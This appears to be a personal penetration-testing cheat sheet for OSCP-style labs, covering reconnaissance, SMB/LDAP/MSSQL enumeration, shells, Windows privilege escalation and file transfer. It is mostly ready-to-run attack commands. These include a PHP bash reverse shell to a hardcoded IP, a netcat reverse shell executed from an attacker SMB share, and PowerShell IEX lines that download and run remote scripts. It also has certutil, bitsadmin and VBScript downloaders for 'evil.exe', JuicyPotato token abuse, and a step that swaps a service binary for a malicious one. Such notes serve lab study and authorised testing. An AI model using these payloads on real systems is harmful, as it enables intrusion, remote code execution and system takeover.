# Recon

Network - Nmap
```
# Ideally run all 3 to get full coverage
$ sudo nmap -v -A [host]  # TCP, OS detection, version detection, script scanning, and traceroute
$ sudo nmap -v -p- [host] # TCP all ports
$ sudo nmap -v -sU [host] # UDP
```

Web - Gobuster
```
$ gobuster dir -u [target] -w ~/OSCP/SecLists/Discovery/Web-Content/[wordlist]
```


### FTP [21 TCP]


### SMB/Samba [139, 445 TCP]

Automated enum
```
$ python3 ~/OSCP/Tools/enum4linux-ng/enum4linux-ng.py [target] 
```

Check for SMB vulnerabilities
```
$ nmap --script smb-vuln-* [target]
```

Enumerate SMB
```
$ smbclient --no-pass -L //10.11.1.31         # list shares
$ smbclient --no-pass \\\\[target]\\[share]   # connect to a share

$ smbmap -u "guest" -R [share] -H 10.11.1.31  # recursively list files in a folder
$ smbget -R smb://[host]/share                # recursively get files from target share/dir
```



### LDAP [389,636 etc. etc.]

https://book.hacktricks.xyz/pentesting/pentesting-ldap

Enumerate LDAP
```
$ nmap -n -sV --script "ldap* and not brute" [target]
```


### MS SQL [1433]
```
# Recommended -windows-auth when you are going to use a domain. use as domain the netBIOS name of the machine
$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
$ sqsh -S <IP> -U <Username> -P <Password> -D <Database>
```

## Shells

Tricks
* Try to URL encode payload if exploit is not working in webapp.

Web shell + SMB exec
```
# Setup local share e.g. python3 ../smbserver.py EVILSHARE .
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share] 

# Execute netcat reverse shell within webshell
> \\[host]\share\nc.exe [host] [port] -e cmd.exe
```

Have a web shell? Check if server can reach you
```
$ sudo tcpdump -i tun0 -n icmp -v
```

Powershell
```
# Exec local PS script
cmd> powershell -executionpolicy bypass ".\rshell.ps1 arg1 arg2"
# Exec remote PS script
PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
```

Powershell locations on 64bit Windows
```
# 32bit powershell
c:\windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
# 64bit powershell
c:\windows\System32\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\sysnative\WindowsPowershell\v1.0\powershell.exe
```

Bypass PHP disable functions
```
<?php shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.5/4444 0>&1'"); ?>
```

## Linux Privilege Escalation


## Windows Privilege Escalation

## Tips

Ensure architecture of your PS shell = architecture of PS payload.
* Check if PS shell is 64bit `[Environment]::Is64BitProcess`

## OS Vulnerabilities

Windows Privesc Checker
```
$ python3 windows_exploit_suggester.py --update
$ python3 windows_exploit_suggester.py --database 2021-10-27-mssb.xls --systeminfo systeminfo.out
```

Sherlock.ps1
1. Copy local `sherlock.ps1` file to remote.
2. Run `cmd> powershell -executionpolicy bypass ".\sherlock.ps1"`.


### Insecure Service Permissions

STEP 1: Check service permissions
```
# windows/winXP
cmd> icacls/cacls [fullpath/to/service]

# powershell
PS> Get-Acl
PS> Get-ChildItem | Get-Acl
```

STEP 2: Replace service binary with malicious binary and restart service.
```
cmd> sc qc [servicename] restart
```



### File & Folder Permissions

### Access Token Abuse

https://www.notion.so/CHEATSHEET-ef447ed5ffb746248fec7528627c0405#5cedd479d1c1429e8018211371eec1ad


JuicyPotato - `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` is enabled
```
cmd> whoami /privs
cmd> JuicyPotato.exe -p C:\inetpub\wwwroot\nc.bat -l 443 -t * -c
```

## File Transfer Methods

### Linux
```
```

### Windows

Powershell
```
# Download file from remote to local
cmd> Powershell -c (New-Object Net.WebClient).DownloadFile('http://[host]:[port]/[file]', '[file]')

# Execute remote PS script
PS> IEX (New-Object System.Net.WebClient).DownloadString('http://[kali]/[script].ps1')
```

Certutil
```
cmd> certutil.exe -urlcache -split -f http://[kali]/[src_file]
```

Bitsadmin
```
cmd> bitsadmin /transfer badthings http://[kali]:[port]/[src_file] [dest_file]
```

Wget -> cscript
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# After you've created wget.vbs
cmd> cscript wget.vbs http://[host]/evil.exe evil.exe
```

SMB
```
# Kali - host SMB share
$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py [sharename] [/path/to/share]  # setup local share

# Target - connect to share
cmd> net view \\[kali]              # view remote shares
cmd> net use \\[kali]\[share]       # connect to share
cmd> copy \\[kali]\[share]\[src_file] [/path/to/dest_file]  # copy file
```


## Password Cracking

Online cracker: https://crackstation.net/
